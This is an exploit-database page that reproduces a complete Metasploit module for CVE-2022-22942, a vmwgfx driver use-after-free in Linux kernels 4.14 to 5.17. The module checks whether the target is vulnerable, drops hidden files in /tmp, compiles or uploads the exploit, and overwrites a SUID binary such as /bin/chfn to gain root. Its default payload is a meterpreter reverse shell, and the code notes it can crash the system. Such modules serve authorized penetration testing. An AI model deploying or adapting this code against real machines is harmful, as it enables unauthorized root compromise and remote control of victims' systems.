---
title: vmwgfx Driver File Descriptor Handling Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023020002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-02
fetch_date: 2025-10-04T05:28:33.976591
---

# vmwgfx Driver File Descriptor Handling Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **vmwgfx Driver File Descriptor Handling Privilege Escalation** **2023.02.01**  Credit:  **[h00die](https://cxsecurity.com/author/h00die/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-22942](https://cxsecurity.com/cveshow/CVE-2022-22942/ "Click to see CVE-2022-22942")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Local
Rank = GoodRanking
include Msf::Post::Linux::Priv
include Msf::Post::Linux::System
include Msf::Post::Linux::Kernel
include Msf::Post::File
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
include Msf::Post::Linux::Compile
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'vmwgfx Driver File Descriptor Handling Priv Esc',
'Description' => %q{
If the vmwgfx driver fails to copy the 'fence\_rep' object to userland, it tries to
recover by deallocating the (already populated) file descriptor. This is
wrong, as the fd gets released via put\_unused\_fd() which shouldn't be used,
as the fd table slot was already populated via the previous call to
fd\_install(). This leaves userland with a valid fd table entry pointing to
a free'd 'file' object.
We use this bug to overwrite a SUID binary with our payload and gain root.
Linux kernel 4.14-rc1 - 5.17-rc1 are vulnerable.
Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic.
},
'License' => MSF\_LICENSE,
'Author' => [
'h00die', # msf module
'Mathias Krause' # original PoC, analysis
],
'Platform' => [ 'linux' ],
'Arch' => [ ARCH\_X86, ARCH\_X64 ],
'SessionTypes' => [ 'shell', 'meterpreter' ],
'Targets' => [[ 'Auto', {} ]],
'Privileged' => true,
'References' => [
[ 'URL', 'https://grsecurity.net/exploiting\_and\_defending\_against\_same\_type\_object\_reuse' ],
[ 'URL', 'https://github.com/opensrcsec/same\_type\_object\_reuse\_exploits' ],
[ 'CVE', '2022-22942' ]
],
'DisclosureDate' => '2022-01-28',
'DefaultTarget' => 0,
'DefaultOptions' => {
'PAYLOAD' => 'linux/x64/meterpreter/reverse\_tcp',
'PrependFork' => true
},
'Notes' => {
'Stability' => [CRASH\_OS\_DOWN],
'Reliability' => [REPEATABLE\_SESSION],
# seeing "BUG: Bad page cache in process <process> pfn:<5 characters>" on console
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS]
}
)
)
register\_advanced\_options [
OptString.new('WritableDir', [ true, 'A directory where we can write and execute files', '/tmp' ])
]
end
def base\_dir
datastore['WritableDir'].to\_s
end
def check
# Check the kernel version to see if its in a vulnerable range
release = kernel\_release
unless Rex::Version.new(release) > Rex::Version.new('4.14-rc1') &&
Rex::Version.new(release) < Rex::Version.new('5.17-rc1')
return CheckCode::Safe("Kernel version #{release} is not vulnerable")
end
vprint\_good "Kernel version #{release} appears to be vulnerable"
@driver = nil
if writable?('/dev/dri/card0') # ubuntu, RHEL
@driver = '/dev/dri/card0'
elsif writable?('/dev/dri/renderD128') # debian
@driver = '/dev/dri/renderD128'
else
return CheckCode::Safe('Unable to write to /dev/dri/card0 or /dev/dri/renderD128')
end
vprint\_good("#{@driver} found writable")
@suid\_target = nil
if setuid?('/bin/chfn') # ubuntu
@suid\_target = '/bin/chfn'
elsif writable?('/bin/chage') # RHEL/Centos
@suid\_target = '/bin/chage'
else
return CheckCode::Safe('/bin/chfn isn\'t SUID or /bin/chage not writable')
end
vprint\_good("#{@suid\_target} suid binary found")
if kernel\_modules&.include?('vmwgfx')
return CheckCode::Appears('vmwgfx installed')
end
CheckCode::Safe('Vulnerable driver (vmwgfx) not found')
end
def exploit
# Check if we're already root
if is\_root? && !datastore['ForceExploit']
fail\_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
end
# Make sure we can write our exploit and payload to the local system
unless writable? base\_dir
fail\_with Failure::BadConfig, "#{base\_dir} is not writable"
end
# backup the suid binary before we overwrite it
@suid\_backup = read\_file(@suid\_target)
path = store\_loot(
@suid\_target,
'application/octet-stream',
rhost,
@suid\_backup,
@suid\_target
)
print\_good("Original #{@suid\_target} backed up to #{path}")
executable\_name = ".#{rand\_text\_alphanumeric(5..10)}"
executable\_path = "#{base\_dir}/#{executable\_name}"
if live\_compile?
vprint\_status 'Live compiling exploit on system...'
payload\_path = "#{base\_dir}/.#{rand\_text\_alphanumeric(5..10)}"
c\_code = exploit\_source('CVE-2022-22942', 'cve-2022-22942-dc.c')
c\_code = c\_code.gsub('/dev/dri/card0', @driver) # ensure the right driver device is called
c\_code = c\_code.gsub('/bin/chfn', @suid\_target) # ensure we have our suid target
c\_code = c\_code.gsub('/proc/self/exe', payload\_path) # change exe to our payload
upload\_and\_compile executable\_path, strip\_comments(c\_code)
register\_files\_for\_cleanup(executable\_path)
else
unless @suid\_target == '/bin/chfn'
fail\_with(Failure::BadConfig, 'Pre-compiled is only valid against Ubuntu based systems')
end
vprint\_status 'Dropping pre-compiled exploit on system...'
payload\_path = '/tmp/.aYd3GAMlK'
upload\_and\_chmodx executable\_path, exploit\_data('CVE-2022-22942', 'pre\_compiled')
end
# Upload payload executable
print\_status("Uploading payload to #{payload\_path}")
upload\_and\_chmodx payload\_path, generate\_payload\_exe
register\_files\_for\_cleanup(generate\_payload\_exe)
print\_status 'Launching exploit...'
output = cmd\_exec executable\_path, nil, 30
output.each\_line { |line| vprint\_status line.chomp }
end
def cleanup
if @suid\_backup.nil?
print\_bad("MANUAL replacement of trojaned #{@suid\_target} is required.")
else
print\_status("Replacing trojaned #{@suid\_target} with original")
write\_file(@suid\_target, @suid\_backup)
end
super
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%
...